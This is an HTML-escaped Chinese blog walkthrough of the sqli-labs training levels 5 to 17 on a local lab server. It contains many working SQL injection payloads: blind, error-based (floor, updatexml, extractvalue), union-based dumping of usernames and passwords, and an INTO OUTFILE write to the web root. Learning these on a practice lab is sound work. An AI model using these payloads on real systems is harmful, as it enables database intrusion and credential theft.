-&lt;h2 id=&#34;判断注入类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断注入类型&#34;&gt;#&lt;/a&gt; 判断注入类型&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM3MTY5Mzc0ODY=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;首先 http://127.0.0.1/sqli-labs-master/Less-5/?id=1&lt;/p&gt;
-&lt;p&gt;出现下面的页面&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164229854-2122047553.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;发现这里没有回显为，通常有三种做法：布尔注入、时间延迟注入、报错注入&lt;/p&gt;
-&lt;p&gt;先用 http://127.0.0.1/sqli-labs-master/Less-5/?id=1 and 1=1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164311519-89001475.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;再用 http://127.0.0.1/sqli-labs-master/Less-5/?id=1 and 1=2&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164342718-2065052248.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;发现回显相同，则这里不是数字型注入&lt;/p&gt;
-&lt;p&gt;用 http://127.0.0.1/sqli-labs-master/Less-5/?id=1‘&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164411285-576453638.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;发现报错所以一定存在注入漏洞&lt;/p&gt;
-&lt;p&gt;用 http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and 1=1 --+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164426650-1606172898.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;用 http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; and 1=2 --+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164440263-551091908.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;发现两次回显不相同，那么这里应该是字符型注入，单引号闭合&lt;/p&gt;
-&lt;h2 id=&#34;同样用二分法判断字段长度&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同样用二分法判断字段长度&#34;&gt;#&lt;/a&gt; 同样用二分法判断字段长度&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzEzMTgwODI5OTE=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MQ==&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&lt;/span&gt;&#39; order by 3--+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164455095-1238823460.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9zcWxpLWxhYnMtbWFzdGVyL0xlc3MtNS8/aWQ9MQ==&#34;&gt;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&lt;/span&gt;&#39; order by 3--+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164507775-1504911268.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;爆库名长度&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆库名长度&#34;&gt;#&lt;/a&gt; 爆库名长度&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI1NTQ3OTEyNzc=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;?id=1&#39; and length (database ())=8 --+ 时有回显&lt;/p&gt;
-&lt;h2 id=&#34;接下来就是进行数据库名称的爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接下来就是进行数据库名称的爆破&#34;&gt;#&lt;/a&gt; 接下来就是进行数据库名称的爆破：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQxOTY3MTQ4Mzg=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;?id=1&#39; and ascii (substr ((select schema_name from information_schema.schemata limit 1,1),1,1)) &amp;gt;’a&#39;--+ 通过二分法不断缩小范围。可以不断的爆出出数据库名称&lt;/p&gt;
-&lt;h2 id=&#34;接下来进行数据库下表的爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接下来进行数据库下表的爆破&#34;&gt;#&lt;/a&gt; 接下来进行数据库下表的爆破：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI2OTcxMzU5Mzg=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;?id=1&#39; and left ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1)=&#39;e&#39;--+ 第一张表的第一个字母 &#39;e&#39;&lt;/p&gt;
-&lt;h2 id=&#34;接下来继续爆列得出第二列是用户名第三列是密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接下来继续爆列得出第二列是用户名第三列是密码&#34;&gt;#&lt;/a&gt; 接下来继续爆列，得出第二列是用户名，第三列是密码；&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzIxNTkyMDYxMDY=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()limit 2,1),8)=&#39;password&#39; --+&lt;/p&gt;
-&lt;h6 id=&#34;以上是盲注的内容这个最好还是程序化的跑脚本比较好手工注入费时&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#以上是盲注的内容这个最好还是程序化的跑脚本比较好手工注入费时&#34;&gt;#&lt;/a&gt; 以上是盲注的内容这个最好还是程序化的跑脚本比较好，手工注入费时&lt;/h6&gt;
-&lt;h2 id=&#34;floor报错注入的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#floor报错注入的方法&#34;&gt;#&lt;/a&gt; floor 报错注入的方法&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzExOTM0NzQ1MDg=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;h4 id=&#34;这里先指明几个知识点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#这里先指明几个知识点&#34;&gt;#&lt;/a&gt; 这里先指明几个知识点&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzgxNzE1NzM0Nw==&#34;&gt;#&lt;/span&gt;&lt;/h4&gt;
-&lt;p&gt;因主键具有唯一性，利用主键重复导致报错，以此提取错误信息。&lt;/p&gt;
-&lt;p&gt;as 其实就是一个别名的作用&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;union select 1,count(&lt;/em&gt;),concat ((注入语句)，floor (rand ()*2)) as a from information_schema.columns group by a --+&lt;/p&gt;
-&lt;p&gt;floor ()、rand ()、group by 语句相结合的报错：&lt;/p&gt;
-&lt;p&gt;1、rand () 函数：&lt;br /&gt;
-rand () 返回 0 到 1 的随机数。&lt;br /&gt;
-rand (0) 返回一个固定的 0 到 1 的伪随机数。&lt;/p&gt;
-&lt;p&gt;2、floor () 函数：&lt;br /&gt;
-floor (x) 返回小于或等于 x 的最大整数。&lt;/p&gt;
-&lt;p&gt;3、group by 语句：&lt;br /&gt;
-group by 语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG, 等函数。&lt;/p&gt;
-&lt;p&gt;详见&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vam9rZXItcWkvcC8xNjAxNTYwMS5odG1s&#34;&gt; floor 报错注入原理 - Joker-qi - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
-&lt;h2 id=&#34;开始floor报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开始floor报错注入&#34;&gt;#&lt;/a&gt; 开始 floor 报错注入&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzE5NTMxMDQ0NTc=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;?id=1&#39; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164529559-915569650.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;?id=1&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164543670-779035287.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;?id=1&#39; union select 1,count(*),concat((select password from users limit 2,1),floor(rand(0)*2))as x from information_schema.tables group by x --+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164555194-1644339986.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;updatexml的报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#updatexml的报错注入&#34;&gt;#&lt;/a&gt; updatexml 的报错注入&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM0MjcyOTY3OTM=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;?id=1&#39; and updatexml(1,concat(0x5e,database(),0x5e),1) --+&lt;/code&gt; ,database () 处可换成任意 SQL 语句&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164607182-1580895556.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;?id=1&#39; and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) --+&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164620333-577328099.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;?id=1&#39; and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+&lt;/p&gt;
-&lt;p&gt;可将 substr 函数里的 1 处依次加 31.（因为每次只能查出 31 为字符）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164628624-1163760604.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;第六题闭合改为双引号即可&lt;/p&gt;
-&lt;h1 id=&#34;第七题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第七题&#34;&gt;#&lt;/a&gt; 第七题&lt;/h1&gt;
-&lt;p&gt;这里第七题打开后发现&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164744197-352870918.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这个与之前的不同，这里说明了要使用 outfile 函数&lt;/p&gt;
-&lt;h2 id=&#34;outfile函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#outfile函数&#34;&gt;#&lt;/a&gt; outfile 函数&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzUzMTQyNjIzMw==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;就是将数据库的查询内容导到一个外部文件&lt;/p&gt;
-&lt;p&gt;这里用老办法试出闭合为’））&lt;/p&gt;
-&lt;p&gt;用 show variables like ‘% secure%’; 查看本机数据库的导出目录，如果随便导出到一个文件夹就会报错（secure_file_priv 所对于的目录就是可以导出文件的地址）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164750199-897628126.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;?id=-1&#39;)) union select 1,database (),user () into outfile&amp;quot;D:/phpstudy_pro/WWW/1.txt&amp;quot; --+ 用这个句型可以查询数据&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164758100-228051775.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;改动祥见 1-4 关笔记&lt;/p&gt;
-&lt;h1 id=&#34;第八-九-十关用盲注做祥见less-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第八-九-十关用盲注做祥见less-5&#34;&gt;#&lt;/a&gt; 第八、九、十关用盲注做祥见 less-5；&lt;/h1&gt;
-&lt;h1 id=&#34;第十一-十二关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第十一-十二关&#34;&gt;#&lt;/a&gt; 第十一、十二关&lt;/h1&gt;
-&lt;h2 id=&#34;打开第十一关发现他有个登录栏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#打开第十一关发现他有个登录栏&#34;&gt;#&lt;/a&gt; 打开第十一关发现他有个登录栏&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzEwNzMxMTczNjY=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164837204-660817188.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;首先尝试用弱口令登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#首先尝试用弱口令登录&#34;&gt;#&lt;/a&gt; 首先尝试用弱口令登录&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQwNjkxNjY2NDE=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164846113-1022473245.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;登录成功&lt;/p&gt;
-&lt;h2 id=&#34;输入单引号引起报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入单引号引起报错&#34;&gt;#&lt;/a&gt; 输入单引号引起报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI2NDI1MDAxNTY=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164852147-470458620.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这个是属于单引号闭合；&lt;/p&gt;
-&lt;h2 id=&#34;用二分法得列数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用二分法得列数&#34;&gt;#&lt;/a&gt; 用二分法得列数&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzE0NDA0MDk4MTU=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39; order by 1#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164859647-768346677.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里将数字一逐个加一直到回显改变&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164906282-958162447.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里我们就可以知道这个列数为二&lt;/p&gt;
-&lt;h2 id=&#34;判断回显位置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断回显位置&#34;&gt;#&lt;/a&gt; 判断回显位置&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI5Njk4MzU5OTE=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39; union select 1,2#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164913474-41172665.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;查询数据库名和当前用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询数据库名和当前用户名&#34;&gt;#&lt;/a&gt; 查询数据库名，和当前用户名&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM5NTc2ODMzOTU=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39; union select database(),user()#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164921645-256865113.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;爆表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆表&#34;&gt;#&lt;/a&gt; 爆表&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQyMTM5MDEyNw==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39; union select database(),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164929661-1478734525.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;看users这个表上面的字段名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#看users这个表上面的字段名&#34;&gt;#&lt;/a&gt; 看 users 这个表上面的字段名&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI2OTc1NzUxMjg=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39; union select (select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164936963-1801874226.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;查询用户名和密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询用户名和密码&#34;&gt;#&lt;/a&gt; 查询用户名和密码&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzIwNjcwNjI4NjA=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39; union select (select group_concat(username) from security.users),(select group_concat(password) from security.users)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314164950554-1026166699.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;第十二关将改为即可&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第十二关将改为即可&#34;&gt;#&lt;/a&gt; 第十二关将’改为 “）即可&lt;/h1&gt;
-&lt;h1 id=&#34;第十三关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第十三关&#34;&gt;#&lt;/a&gt; 第十三关&lt;/h1&gt;
-&lt;p&gt;这个题打开后&lt;/p&gt;
-&lt;p&gt;先用弱口令登录发现登录上但是没有回显，考虑使用报错注入&lt;/p&gt;
-&lt;h2 id=&#34;首先了解一波报错的句型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#首先了解一波报错的句型&#34;&gt;#&lt;/a&gt; 首先了解一波报错的句型&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzE1Mzk5ODkyOTk=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;h3 id=&#34;floor报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#floor报错&#34;&gt;#&lt;/a&gt; floor 报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzMxNDM2NzQ3OTE=&#34;&gt;#&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;&lt;em&gt;union select 1,count(&lt;/em&gt;),concat ((注入语句)，floor (rand ()*2)) as a from information_schema.columns group by a&lt;/p&gt;
-&lt;p&gt;祥见 5-6 关&lt;/p&gt;
-&lt;h3 id=&#34;updatexml报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#updatexml报错&#34;&gt;#&lt;/a&gt; updatexml 报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI0MzY2MDU2NDE=&#34;&gt;#&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;and updatexml (1,concat (注入语句),1)&lt;/p&gt;
-&lt;h3 id=&#34;extractvalue报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#extractvalue报错&#34;&gt;#&lt;/a&gt; extractvalue 报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI4ODExMTY5ODU=&#34;&gt;#&lt;/span&gt;&lt;/h3&gt;
-&lt;p&gt;and (extractvalue (1,concat (注入语句)))&lt;/p&gt;
-&lt;h2 id=&#34;先用floor报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#先用floor报错&#34;&gt;#&lt;/a&gt; 先用 floor 报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM2MzQwOTYxNzA=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39;) union select count(*),concat((select user()),floor(rand(0)*2))a from information_schema.columns group by a#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170034190-29499768.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&#39;) union select count(*),concat((select password from users),floor(rand(0)*2))a from information_schema.tables group by a#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170056710-97820973.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;用updatexml报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用updatexml报错&#34;&gt;#&lt;/a&gt; 用 updatexml 报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI0ODU1MDIxNQ==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170105687-1661554095.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&#39;) and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170111524-675798314.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;用extractvalue报错&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用extractvalue报错&#34;&gt;#&lt;/a&gt; 用 extractvalue 报错&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM0MTE4NjcyMDA=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&#39;) and extractvalue(0x7e,(select database()),0x7e))#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314170140846-916061629.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;第十四题闭合为” 其余参考十三题&lt;/p&gt;
-&lt;h1 id=&#34;第十七关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第十七关&#34;&gt;#&lt;/a&gt; 第十七关&lt;/h1&gt;
-&lt;h2 id=&#34;打开发现如图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#打开发现如图&#34;&gt;#&lt;/a&gt; 打开发现如图&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQ2NDA5MDAxMA==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213756395-518273297.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;PASSWORD RESET 他这里显示重置密码&lt;/p&gt;
-&lt;p&gt;这里对账号框尝试了很多闭合发现都登录失败于是我投考了度娘，打开了 PHP 文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213752293-758194299.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里我们可以看到，他先审核了账号，如果账号存在则对密码进行操作可知，这个注入点在密码框里且使用单引号闭合&lt;/p&gt;
-&lt;h2 id=&#34;下面开始爆库名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下面开始爆库名&#34;&gt;#&lt;/a&gt; 下面开始爆库名&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzMzNzYyODAxMTA=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;User Name 上面输入 admin&lt;/p&gt;
-&lt;p&gt;New Password 上面用 1‘ and updatexml (1,concat (0x5e,database (),0x5e),1)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213746117-1356775353.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;爆名成功，其余步骤见第 5-6 关&lt;/p&gt;
